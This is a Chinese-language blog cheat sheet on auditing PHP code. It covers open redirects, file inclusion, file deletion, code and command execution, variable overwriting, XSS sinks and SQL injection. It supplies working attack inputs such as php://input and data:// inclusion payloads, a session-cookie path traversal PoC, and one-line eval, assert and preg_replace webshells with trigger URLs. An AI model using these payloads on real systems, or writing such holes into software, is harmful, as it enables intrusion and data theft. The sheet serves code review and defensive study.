---
title: PHP Code Review
date: 2016-03-15 00:19:17
tags: 代码审计
---

## 代码审计

### redirection/URL重定向
#### 1) META标签内跳转
```
<meta http-equiv="refresh" content="0.1; url=http://blog.safebuff.com/">
```
#### 2) Javascript跳转
```
<script>window.location.href = "http://baidu.cn/";</script>
<script>self.location = "http://baidu.cn/";</script>
<script>top.location = "http://baidu.cn/";</script>
<script>window.navigate("http://baidu.cn/");</script>   #只对IE系列浏览器有效
```
#### 3) header头跳转
```
<?php
    header("Location: http://baidu.cn/");
?>
```
### 本地文件包含
#### 1) include()/include\_once()，require()/require\_once()本地文件包含

> http://www.domain.com/test.php?mod=phpinfo

> http://www.domain.com/test.php?mod=phpinfo.php%00

```
<?php
    //test.php
    define("ROOT",dirname(__FILE__).'/');
    $mod = $_GET['mod'];    //可控
    include(ROOT.$mod.'.php');
?>
<?php
    //phpinfo.php
    phpinfo()
?>
```
#### 2) allow\_url\_include远程文件包含

```
#allow_url_fopen=On
#allow_url_include=On
remote.php?file=[http|https|ftp]://example.com/shell.txt
remote.php?file=php://input     #POST: <?php phpinfo();?>
remote.php?file=php://filter/convert.base64-encode/resource=webshell.php
remote.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
remote.php?file=zip://D:/apache/www/htdocs/test.jpg#phpinfo.php     //phpinfo.php压缩命名为test.jpg
```

#### 3) bypass file include
> include($file.'.php');

```
test.php  =>  test.php%00
/   => %2f
```
#### 4) bypass ../../
```
/./ ==> //
file://
php://  ==> http://www.example.com/php.php?file=php://filter/convert.base64-encode(内容被base64编码)/resource=example.txt(远程文件)
http://
ftp://
zlib://
glob://
phar://
ssh2://
rar://
ogg://
expect://
```
### 信息泄漏
```
<?php phpinfo();?>
```
### 文件读取
#### 关键函数
```
file_get_contents()
highlight_file()
fopen()
read file()
fread()
fgetss()
fgets()
parse_ini_file()
show_source()
file()
```
### 删除文件
```
unlink()
session_destroy()
```
> example

```
<?php 
    //test.php
    session_save_path('./');
    session_start();
    if($_GET['del']) 
    {
        session_unset();
        session_destroy();
    }
    else
    {
        $_SESSION['hei']=1;
        echo(session_id());
        print_r($_SESSION);
    }
?>
//http://www.example.com/test.php     
```
> POC

```
cookie:PHPSESSID=/../1.php
```
### 随机函数
```
rand() VS mt_rand()
```
```
<?php
    //on windows
    print mt_getrandmax(); //mt_rand max 2147483647
    echo "</br>";
    print getrandmax();// rand max 32767
?>
//可暴力跑包
```
### 会话认证
> 大多数情况下会出现在如下情况中

```
cookie
session
oauth
openid
```

### 文件上传漏洞
```
中间件解析
move_uploaded_file()
文件头 content-type验证绕过
％00截断
```
### 代码执行漏洞

#### 1) eval()、assert()
```
<?php eval(" phpinfo(); ");?>
<?php assert(" phpinfo(); ");?>
<?php $a="${@phpinfo()}";?>
```
#### 2) preg\_replace()

> mixed preg\_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )

```
<?php echo $regexp = $_GET['reg'];$var = '<php>phpinfo()</php>';preg_replace("/<php>(.*?)$regexp", '\1', $var);?>

http://www.example.com/shell.php?reg=%3C/php%3E/e
```
```
<?php @preg_replace("//e",$_GET['shell'],"Access Denied");?>

http://www.example.com/shell.php?shell=phpinfo()
```
```
<?php preg_replace("/s*[php](.+?)[/php]s*/ies", "\1", $_GET['h']);?>

http://www.example.com/shell.php?h=[php]${phpinfo%28%29}[/php]
or
http://www.example.com/shell.php?h=[php]phpinfo()[/php]
```
#### 3) 回调函数call\_user\_func()
```
<?php
    //test.php?a=assert
    $a = $_GET['a'];
    call_user_func($a,'phpinfo()');
?>
```
#### 4) 动态函数执行
```
<?php
    //test.php?a=assert&b=phpinfo()
    $_GET['a']($_GET['b']); ///assert(phpinfo());
?>
```
#### 5) 命令执行函数
> system(), exec(), shell\_exec(), passthru() ,pcntl\_exec(), popen(),proc\_open()、`whoami`

```
<?php 
popen( 'whoami >> 1.txt', 'r' ); 
?>
```
#### 6) ob\_start()函数
```
<?php ob_start('assert');echo $_REQUEST['pass'];ob_end_flush();?>

http://www.example.com/shell.php?e=assert&pass=file_get_contents('http://www.dnsdomain.com/')
```
### 变量覆盖
#### 1) extract()函数
```
extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖。
语法
　　extract(array,extract_rules,prefix)
参数
　　array 必需。规定要使用的输入。
　　extract_rules
　　　　·EXTR_OVERWRITE – 默认。如果有冲突，则覆盖已有的变量。
　　　　·EXTR_SKIP – 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）
　　prefix 可选。
```
> example

```
<?php
$size = "large";
$var_array = array("color" => "blue",
                   "size"  => "medium",
                   "shape" => "sphere");
extract($var_array);

echo "$color, $size, $shape";
?>
```
> 输出

```
blue, medium, sphere
```
#### 2) 遍历初始化变量
```
<?php
    //test.php?a=test
    $a='hi';
    foreach($_GET as $key => $value) {
        $key = $value;
    }
    print $a;
?>
```
> 输出

```
hi
```
#### 3) parse\_str()变量覆盖漏洞
```
parse_str() 函数把查询字符串解析到变量中。
语法
　　parse_str(string,array)
参数
　　string 必需。规定要解析的字符串。
　　array 可选。规定存储变量的数组名称。该参数指示变量存储到数组中。
```
> example

```
<?php
$str = "first=value&arr[]=foo+bar&arr[]=baz";
parse_str($str);
echo $first;  // value
echo $arr[0]; // foo bar
echo $arr[1]; // baz

parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz

?>
```
#### 4) import\_request\_variables()变量覆盖漏洞
```
将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了register_globals，但又想用到一些全局变量，那么此函数就很有用。
语法
　　bool import_request_variables ( string types [, string prefix] )
参数
　　types指定需要导入的变量，可以用字母'G'、'P'和'C'分别表示 GET、POST 和 Cookie。注意这些字母的顺序，当使用"GP"时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。
　　prefix可选参数，作为变量名的前缀，置于所有被导入到全局作用域的变量之前。
```
> example

```
<?php
//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1
    echo 'GLOBALS '.(int)ini_get("register_globals")."n";
    import_request_variables('GPC');
    if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');
    echo 'Hello admin!';
?>
```
#### 5) $$可变变量
```
<?php
$a = 'hello';
$$a = 'world';  //相当于$hello = 'world'
?>
```
### XSS
> 一般情况下在挖掘XSS代码时寻找如下函数
```
print
print_r
echo
printf
sprintf
die
var_dump
var_export
```

### SQL注入
#### 二次注入
> 假设开启了GPC 使用urldecode()、rawurldecode()时,开启GPC和addslashes是一样的效果

```
/test.php?id=1%2527     ＃产生了注入相当于 %2527 ==> %27 ==> '
<?php
    $a = addslashes($_GET['p']);
    $b = urldecode($a);
    echo $a     #1%27
    echo $b     #1'
?>
```